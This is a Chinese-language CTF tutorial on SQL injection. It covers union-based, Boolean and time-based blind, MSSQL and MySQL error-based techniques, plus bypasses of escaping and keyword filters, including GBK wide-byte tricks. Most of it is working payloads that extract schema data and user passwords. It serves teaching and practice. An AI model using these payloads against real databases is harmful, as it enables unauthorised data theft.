# CTF - SQL注入

[TOC]

## 显式注入步骤

### SQL - 注释符

**Mysql 有三种常用注释符：**

- `-- `  ：注意，这种注释符后边有一个**空格**
- `#` 通过`#`进行注释

- `/* */` 注释掉符号内的内容

  

### 1、注入与注入类型判断

#### 数字型注入

当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

测试步骤：

1. **加单引号`'`，URL：`id=3'`**

   对应的sql：`select * from table where id=3'` 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；

2. **加`and 1=1` ,URL：`id=3 and 1=1`**

   对应的sql：`select * from table where id=3 and 1=1` 语句执行正常，与原始页面无任何差异；

3. **加`and 1=2`，URL：`id=3 and 1=2`**

   对应的sql：`select * from table where id=3 and 1=2` 语句**可以正常执行，但是无法查询出结果**，所以返回数据与原始网页存在差异

如果满足以上三点，则可以判断该URL存在**数字型**注入。

#### 字符型注入

当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

例如数字型语句：`select * from table where id=3`

则字符型如下：`select * from table where name='admin'`

因此，在构造payload时通过闭合单引号可以成功执行语句：

测试步骤：

1. **加单引号`'`，URL：`name=admin'`**

   对应的sql：`select * from table where name=' admin' '`由于加单引号后变成三个单引号，则无法执行，程序会报错；

2. **加 `' and 1=1` ，URL：`name=admin’ and 1=1`**

   此时sql 语句为：`select * from table where name=' admin ' and 1=1'` ,也无法进行注入，还需要通过注释符号将其绕过；

   因此，构造语句为：`select * from table where name =' admin ' and 1=1-- '` 可成功执行返回结果正确；

3. **加 `' and 1=2 -- ` ，URL：`name=admin’ and 1=2--  `** 

   此时sql语句为：`select * from table where name=’admin’ and 1=2 -- ’` 则会报错

如果满足以上三点，可以判断该url为**字符型**注入。



### 2、字段数量判断：`order by`

在链接后面添加语句`【 order by 11 (数字任意) 】`，根据页面返回结果，来判断站点中的字段数目。



### 3、确定字段显示位置：`union select 1,2,3,...`

**1,2,3, 根据步骤2中判断的字段数目确定**



### 4、获取当前数据库：`database()`

`union select 1,2,database(),4,...`

或：

`select schema_name from schemata` 

`select schema_name from information_schema.schemata limit 0,1` 



### 5、获取数据库中的表

`select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database();`



### 6、获取表中字段

`select column_name from information_schema.columns where TABLE_SCHEMA='sqli' and TABLE_NAME='user';`



### 7、获取字段中内容

`union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`



[返回目录](#CTF - SQL注入)

------



## SQL注入 - 盲注

### 基于布尔的盲注

#### 1、注入与注入类型判断

与显式注入相同



#### 2、猜解数据库名

1. **猜解数据库名的长度**

   `and length(database()) = 1 #` 

   ...

2. **猜解数据库名**

   `and ascii(substr(database(),1,1)) = 97 #` 

   

#### 3、猜解数据库中的表名

1. **猜解数据库中表的数量**

   `and (select count(table_name) from information_schema.tables where table_schema = database()) = 1 #` 

2. **挨个猜解表名**

   - **判断表的长度**

     `and length(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1)) = 1 #` 

   - **猜表名**

     `ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = 103 #`

#### 4、猜解表中字段名

1. **猜解表中字段数量**

   `and (select count(column_name) from information_schema.columns where table_name = 'users') = 1 #` 

2. **猜解字段名**

   - **判断字段长度**

     `and length(substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1)) = 1 #`

   - **猜解字段名**

     `1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 3,1),1,1)) = 117 #`

#### 5、猜解数据

1. **猜解数据数量**

2. **猜解数据**

   - **猜解数据长度**

     `and length(substr((select user from users limit 0,1),1)) = 5 #`

   - **猜解数据内容**

     `and ascii(substr((select user from users limit 0,1),5,1)) = 110 #`



### 基于时间的盲注

#### 1、判断是否存在注入，注入是字符型还是数字型

输入 `1' and sleep(5) #` ，明显延迟；

输入 `1 and sleep(5) #` ，没有延迟；

说明存在字符型的基于时间的盲注。

#### 2、猜解当前数据库名

- 猜解数据名的长度

  ```
  1' and if(length(database()) = 1,sleep(5),1) # 没有延迟
  
  1' and if(length(database()) = 2,sleep(5),1) # 没有延迟
  
  1' and if(length(database()) = 3,sleep(5),1) # 没有延迟
  
  1' and if(length(database()) = 4,sleep(5),1) # 明显延迟
  ```

  说明数据库名长度为4个字符。



操作步骤与基于布尔的盲注类似，稍有不同，加入if（）语句。

基于布尔：`length(database()) = 3`

基于时间：`if(length(database()) = 3,sleep(5),1) #`

同样其余语句操作类似。



[返回目录](#CTF - SQL注入)

------



## Mssql回显注入

### 获取数据库使用：`db_name()`

### 爆出所要数据库的表和内容

1. 每个数据库中都有一个**sysobjects系统表**，通过这个表**读取数据库的表**。

   `and 1=2 union select 1,'2',name,'4',5 from sysobjects where xtype='u'`

2. 获取第二个表的名字。通过构造SQL语句可以爆出第二个表的名字，得到用户表User。仔细观察SQL语句的书写技巧：

   `id=1 and 1=2 union select top 1 1,'2',name,'4',5 from sysobjects where xtype='u' and name not in (select top 1 name from sysobjects where xtype = 'u')`

3. 找到用户后，通过系统表`syscolumns`爆出字段的名字。语句为：`id=1 and 1=2 union select top 1 1,'2',name,'4',5 from syscolumns where id = (select id from sysobjects where name= 'user')`，获取第一个字段。

4. **获取第二个字段。**

   `and 1=2 union select top 1 1,'2',name,'4',5 from syscolumns where id = (select id from sysobjects where name= 'user') and name not in(select top 1 name from syscolumns where id =(select id from sysobjects where name='user'))`，依次可以找出该表中还有password和role字段。

5. **获取字段内容。**

   从表user中获取name字段的内容。

      ![img](image\55.jpg)

      这里user添加一个[]是因为系统表中也存在user表，把name换成password和role就可以爆出相应字段的内容。



[返回目录](#CTF - SQL注入)

------



## MySql报错注入

**最常用三种报错注入方式分别是：`floor()`、`updatexml()`、`extractvalue()`。**

### floor()

`select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`

![img](image\202.png)

### extractvalue()

`select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`

![img](image\251.png)

### updatexml()

`select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));`

![img](image\1016026-20160928205451969-1920882857.png)

### geometrycollection()

`select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928205719485-521701933.png)

### multipoint()

`select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928205942266-563740245.png)

### polygon()

`select * from test where id=1 and polygon((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928205828281-760176387.png)

### multipolygon()

`select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928210038094-1420034123.png)

### linestring()

`select * from test where id=1 and linestring((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928210144438-1099086559.png)

### multilinestring()

`select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));`

![img](image\1016026-20160928210420750-344279412.png)

### exp()

`select * from test where id=1 and exp(~(select * from(select user())a));`

![img](image\1016026-20160928210533313-2028104812.png)



[返回目录](#CTF - SQL注入)

------



## SQL注入 - 过滤绕过

### 绕过条件过滤

#### 过滤注释：`or'`

![img](image\headImg.actc.gif)

`id=1' or '`

`id=1’ and select database() or’`



#### 过滤OR&AND

![img](image\629324b5-7085-4737-b04f-b335e0e9ac8b.gif)

使用『&&』替代『and』，『||』替代『or』。

此处还有个问题，就是`preg_replace`按照代码中的用法是**无限次替换**的，但实际中却可以使用『oorr』这样来绕过，这不科学。



#### 过滤空格和注释 

![img](image\152a-4d2f-81de-e043fb15ae20.gif)

**过滤空格：利用`+`进行绕过**



[返回目录](#CTF - SQL注入)



### 绕过`UNION`&`SELECT`过滤

#### 大小写绕过

![img](image\4f502220-7af2-4ddf-aa47-d90d75d4876f.gif)

上面的代码，正则修饰符不是『i』而是『s』，则意味着匹配的对象是**大小写敏感**的，那么就简单多了呢。

但是空格和星号还是被吃掉了，继续想办法。在MySQL中tab，空格，回车都可以隔断语句，那么我们就可以用使用`/**/` 或`()` 或`+` 代替空格，**%0c =换页、%09 = 水平制表符、%0d = 回车、%0a = 换行**。



#### `union all select`绕过

![img](image\149e0a17-e97c-4315-807a-e1a44da71c3f.gif)

此处是过滤掉『**union任何空白符select**』，可以使用『**union all select**』



[返回目录](#CTF - SQL注入)



### 绕过函数过滤

#### 绕过给危险字符加反斜杠的过滤（宽字节注入）

   ![img](image\a6039846-c7b6-4d7d-a1e0-559e8f86cea8.gif)

   ![img](image\0d1bd403-849e-4542-b696-7475537615ce.gif)

解析：本代码有三个过滤，第一个是过滤将**反斜线替换为双反斜线**。第二个和第三个分别是**将单引号和双引号转义**，即**在引号前面添加反斜线**。

一般情况下，此处不存在SQL注入漏洞。

但如果数据库是GBK编码的，那我们就可以进行『宽字节』注入了。

   首先直接注入测试

   ![img](image\ca4954f9-1906-457a-ade0-2effd778ea40.gif)

   发现单引号被转义了。

我们在URL中插入的单引号之前插入**`%bf`**，单引号是**`%27`**。反斜线是**`%5c`**。

『`% bf \'』就变成了『 `%bf%5c%27` 』，相当于再显示就变成了『縗’』，单引号出来了。

则最后的SQL语句就变成了『`SELECT * FROM users WHERE id='-11縗' union select * from users where id =3-- ' LIMIT 0,1`』因此突破了转义函数。

   怎么吃的：

   GBK编码，它的编码范围是0×8140~0xFEFE(不包括xx7F)，在遇到%df(ascii(223)) >ascii(128)时自动拼接%5c，因此吃掉‘\’，而%27、%20小于ascii(128)的字符就保留了。



####  绕过 `AddSlashes()` 函数

  关键代码

   ![img](image\3b692354-6856-4321-9def-e3e6675a0ce5.gif)

其实如前面介绍的，这个`addslashes()`函数也上一个自定义函数差不多，只不过多了个NULL转义而已。因此，宽字符注入一样有效。

注入语句依旧『`id=-11%bf%27union+select+*+from+users+where+id+=3—+`』。



#### 绕过`mysql_real-escape_string()`函数

这里的函数变成了`mysql_real_escape_string()`，它比`addslashes()`函数多转义了换行符、制表符等。理论上这个函数是很安全，而且能避免宽字节注入的。

   ![img](image\9d29a802-42ca-4524-8ef0-e5fe8d36b2a6.gif)

但我们依旧可以使用宽字符绕过。

SQL语句为『`id=-1%bf%27+union+select+*+from+users+where+id+=3—+`』



[返回目录](#CTF - SQL注入)



### 绕过伪静态

伪静态：伪静态通俗点说就是假的静态页面，也就是通过各种技术手段，让动态页面的URL看上去和静态页面的一样。

.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。

我们这里利用.htaccess文件，配置重写引擎，来实现伪静态的效果。

#### 无扩展名形式

发现地址栏是类似这样『Less-37/id/1』，目录形式，没有扩展名。那我们把这个1删除试试。发现报错

   ![img](image\9341e075-6e4e-4f37-b9e7-4e88fd096dc5.gif)

在1后面添一个单引号咧，果断报错。

   ![img](image\f1745a65-a5bf-4f53-b7dd-4fd7f2cb1933.gif)

因此此处的注入点为数字1后面，并且是显错注入。



#### 有扩展名形式

发现它打开的页面是『Less-38/id/1.html』。

   ![img](image\587e734d-3390-45bf-aecd-f200260bf076.gif)

1.html，貌似是静态网页啊，那我们将1改为2咧。

   ![img](image\527618a7-3ab8-42af-ade6-c351c08d2081.gif)

是正常页面，信息是ID=2人的用户信息。那么我们在后面打个单引号呢

   ![img](image\b5f57849-153d-4eb8-97b8-47bec2fa6367.gif)

报错了，那这里不是注入点。那打在2后面，.html前面呢，出现SQL错误咯。

   ![img](image\09501655-38ee-43da-abd2-5b58e70be703.gif)

注入点在数字部分。



[返回目录](#CTF - SQL注入)



### 绕过`is_numeric()`过滤

`is_numeric()`函数用于检测变量是否为数字或数字字符串。

绕过`is_numeric()`的方法：将SQL注入的payload转换为**十六进制**表示。

例如，payload为2’ and 1=1，则先选中该payload，利用Firefox中的hackbar工具，选择EncodingàHEX EncodingàString to 00ff00ff，即可完成十六进制转换，转换结果为322720616e6420313d31；接着，为了让PHP知道该字符串是十六进制数据，还需要在前面加上**0x**，最终变成0x322720616e6420313d31。



[返回目录](#CTF - SQL注入)

------



## 其他注入形式

### 搜索性注入

#### 精确搜索

此处的SQL代码为：『`SELECT * FROM users WHERE id='$id'`』。

对于一般的精确搜索来说，都是指定某一编号，然后能得到具体结果。这种和普通的POST注入差不多。



#### 模糊搜索

此处的SQL代码为：『SELECT * FROM users WHERE username like '%$uname%' order by id 』。

这里使用了『LIKE %关键词%』的形式，表示只要关键词完整的存在于数据中，无论是什么位置，都返回。一般来说模糊搜索检索的都是正文中的文字，符号等信息。